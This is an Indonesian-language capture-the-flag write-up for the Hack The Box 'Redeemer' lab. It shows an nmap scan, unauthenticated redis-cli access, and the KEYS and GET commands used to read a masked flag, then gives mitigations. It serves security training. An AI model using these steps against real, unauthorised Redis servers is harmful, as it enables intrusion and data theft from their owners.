# HTB Starting Point - Redeemer (Writeup)

**Platform:** Hack The Box - Starting Point  
**Tier:** 0 (Pemula)  
**Kategori:** Redis / Misconfiguration / Unauthenticated Access

---

# Ringkasan
Mesin *Redeemer* mengajarkan cara melakukan scanning port menggunakan Nmap, menemukan service Redis, lalu mengeksploitasi kesalahan konfigurasi karena Redis dapat diakses tanpa autentikasi.  
Dari Redis database ditemukan flag.

---
# Tools yang Digunakan
- Nmap
- redis-cli

---
# Informasi Target
- **Nama Mesin:** Redeemer
- **IP Target:** 10.129.154.47

---

# 1. Reconnaissance (Scanning)

Langkah pertama adalah scanning untuk mengetahui port yang terbuka.

Command:
```bash
nmap -sC -sV 10.129.154.47
```

Salah satu Hasil Yang di dapatkan :
```bash
6379/tcp open redis
```

Port 6379 adalah port default untuk service Redis.

# 2. Enumeration Redis

Redis adalah database in-memory yang sering digunakan untuk caching atau penyimpanan data cepat.
Jika Redis terbuka tanpa password, attacker dapat membaca/menulis data secara bebas.

**Untuk terhubung ke Redis gunakan redis-cli.**

Command:
```bash
redis-cli -h 10.129.154.47
```

Jika berhasil, akan masuk ke prompt redis:
```bash
10.129.154.47:6379>
```

# 3. Exploitation (Akses Redis Tanpa Password)

Langkah awal adalah mengecek informasi server Redis.

Command:
```bash
INFO
```

Lalu cek database yang tersedia.

Command:
```bash
INFO keyspace
```

Biasanya akan muncul output seperti:
```bash
db0:keys=...
```
Artinya ada database db0 dengan sejumlah key.

# 4. Mencari Data dan Flag

Untuk melihat semua key yang tersedia, gunakan:
```bash
KEYS *
```

*Redis akan menampilkan daftar key yang tersimpan.*

Setelah menemukan key yang mencurigakan (misalnya flag atau nama lain), tampilkan nilainya dengan:
```bash
GET <nama_key>
```

Jika flag disimpan sebagai string, maka outputnya akan langsung menampilkan flag.

Contoh:
```bash
GET flag
```

Flag akan muncul.

```bash
HTB{*******************************}
```

# 5. Analisis Kerentanan
Penyebab Masalah

**Service Redis berjalan dengan konfigurasi yang salah karena:**

- Redis terbuka untuk koneksi jaringan luar
- Redis tidak menggunakan autentikasi password

Kategori masalah:

- Misconfiguration
- Unauthorized Access
- Information Disclosure

**Dampak**

Jika Redis pada sistem nyata dibiarkan terbuka, attacker dapat:

- membaca data sensitif
- memodifikasi database
- menghapus data penting
- melakukan serangan lanjutan (kadang bisa sampai RCE jika environment rentan)

# 6. Mitigasi (Rekomendasi Keamanan)

Solusi yang seharusnya dilakukan administrator:

- Batasi Redis hanya untuk localhost (127.0.0.1)
- Gunakan password Redis (requirepass)
- Gunakan firewall untuk menutup port 6379 dari publik
- Gunakan Redis ACL (Access Control List)
- Monitor koneksi dan aktivitas Redis
